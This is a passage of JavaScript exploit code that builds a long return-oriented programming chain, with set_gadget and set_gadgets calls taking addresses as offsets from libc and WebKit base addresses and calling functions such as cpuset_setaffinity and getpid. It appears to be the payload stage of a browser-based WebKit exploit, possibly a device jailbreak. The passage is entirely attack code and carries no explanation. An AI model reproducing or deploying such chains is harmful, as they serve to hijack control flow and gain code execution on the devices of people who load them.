libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+312488, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+312504, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+312616, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+312600, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
cpuset_setaffinity_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+313944, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
getpid_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+315272, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+315344, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+315408, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([2248, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+315552, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+392512, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+315688, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+315704, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+315672, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+315816, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+315800, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
libc_base+793877, 
ropchain+315944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+315960, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+315928, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+316064, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+316112, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+316096, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+316224, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+316216, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+316240, 
ropchain+316680, 
libc_base+50775, 
libc_base+793877, 
ropchain+316280, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([179, 0]); 
set_gadget(libc_base+788575,); 
db([179, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+316432, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+316448, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+316416, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+316544, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+316560, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+316672, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+316656, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+316776, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+316832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+316896, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+316984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+317000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+317152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+317184, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+317136, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+317168, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+317256, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+317272, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+317368, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+317352, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+317448, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([16, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+317600, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+317616, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+317584, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+317784, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+317800, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+317768, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+317904, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+317952, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+317936, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+318064, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+318056, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+318080, 
ropchain+318096, 
libc_base+811575, 
ropchain+318112, 
libc_base+811575, 
ropchain+319072, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([28, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+318320, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+391184, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+318408, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+318496, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+318512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+318664, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+318696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+318648, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+318680, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+318792, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+318776, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+318880, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+318952, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+319016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+316840, 
libc_base+759626, 
libc_base+793877, 
ropchain+319128, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967278, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+319232, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+319344, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+295616, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+319432, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+319520, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+319536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+319680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+319648, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+319664, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+319776, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967278, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+319864, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+319880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+320040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+320008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+319992, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+320096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+320200, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+320232, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+320216, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+320392, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+320360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+320344, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+320496, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+320480, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+397944, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+320648, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+320736, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+320824, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+320840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+320952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+320920, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398352, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+321088, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+321104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+321248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+321216, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+321232, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+321328, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([29080032, 0]); 
set_gadget(libc_base+788575,); 
db([29080032, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+321480, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+321496, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+321464, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+321600, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+321728, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+321744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+321856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+321824, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398816, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+321976, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+321992, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+322136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+322104, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+322120, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+322216, 
webkit_base+7438103, 
webkit_base+3750700 
